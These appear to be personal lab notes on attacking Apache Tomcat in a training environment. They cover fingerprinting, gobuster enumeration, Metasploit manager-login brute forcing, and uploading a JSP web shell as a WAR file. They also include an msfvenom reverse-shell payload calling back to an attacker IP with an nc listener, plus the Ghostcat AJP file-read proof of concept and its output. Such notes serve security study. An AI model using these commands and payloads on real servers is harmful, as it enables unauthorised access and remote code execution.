Apache Tomcat is an opensource web server that host application written in java. It was initially designed to run java servlet and java server pages(JSP) scripts.  By [BuiltWith](https://trends.builtwith.com/Web-Server/Apache-Tomcat-Coyote) there are over 220,000 live Tomcat websites at this time.

1.22% of top 1 M sites and 3.8% of 100k sites.
In webserver it has 13 position.
## Discovery/Footprinting

We run eyewitness and revealed that Tomcat server is running.
![[tomcat_invalid.webp]]
```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 

<SNIP>
```

Directory structure of Tomcat.
```shell
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

Bin store binary files require to run server, conf store configuration files and tmocat-users.xml store assigned roles and credentials.
Lib fonder hold jar files, log and temp store temp logs and webapps default webroot of tomcat while work act as cache.

Each folder inside `webapps` is expected to have the following structure.
```shell-session
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```

The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. Store routes and classes handling. All compiled classes handling used by app store in `WEB_INF/classes` Classes contain sensitive info .The `lib` folder stores the libraries. The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`, which can be compared to PHP files on an Apache server.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```

The `web.xml` configuration adefine new servlet named `AdminServlet` mapped to class `com.inlanefreight.api.AdminServlet`.Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:
```path
classes/com/inlanefreight/api/AdminServlet.class
```

 New servlet mapping is created to map requests to `/admin` with `AdminServlet`. This configuration will send any request received for `/admin` to the `AdminServlet.class` class for processing. The `web.xml` descriptor contain sensitive information check when leveraging a Local File Inclusion (LFI) vulnerability.

The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.

```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```

The file shows us what each of the roles `manager-gui`, `manager-script`, `manager-jmx`, and `manager-status` provide access to. In this example, we can see that a user `tomcat` with the password `tomcat` has the `manager-gui` role, and a second weak password `admin` is set for the user account `admin`.

After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager` and the `/host-manager` pages. We can attempt to locate these with a tool such as `Gobuster` or just browse directly to them.

```shell
 gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://web01.inlanefreight.local:8180/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/21 17:34:54 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
Progress: 49959 / 87665 (56.99%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/09/21 17:44:29 Finished
===============================================================
```

If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_\(file_format\)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web) file containing a JSP web shell and obtain remote code execution on the Tomcat server.

## **Attacking Tomcat**
If we can access tomcat /manager or /host-manager endpoints so we can bruteforce for password.
we can use a metasploit auxilary `auxiliary/scanner/http/tomcat_mgr_login` for this work.

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) >run
```

It will start bruteforce the page for password. We can also use other tools or create python script. We can also use Brupsuite or ZAP as proxy. 

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080

PROXIES => HTTP:127.0.0.1:8080

msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

![[Pasted image 20250923103506.png]]

Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.
![[Pasted image 20250923111543.png]]

Manager web app allow us instantly deploy new applications by uploading WAT files. It can be created using zip utility. A JSP web shell can be downloaded.
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp 

```


We could also use msfvenom to generate a malicious WAR file. The payload `java/jsp_shell_reverse_tcp` will execute a reverse shell through a JSP file.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

```bash
nc -nvlp 4443
```

The `multi/http/tomcat_mgr_upload `[Metasploit](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) module can be used to automate the process.  We can use this [jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp) web shell which is light weight and help us to remain undetected. We can also do some miner changed in it.

**CVE-2020-1938 : Ghostcat**
Recently found that Tomcat server   9.0.31, 8.5.51, and 7.0.100 vulnerable to LFi. It caused by misconfiguration in AJP protocol. Apache jserv protocol a binary protocol used to proxies the request to App server behind front end. 
```bash
 nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

POC of code can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi).

```bash
 python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at
```

 It’s common to find Tomcat running as high-privileged users such as SYSTEM or root.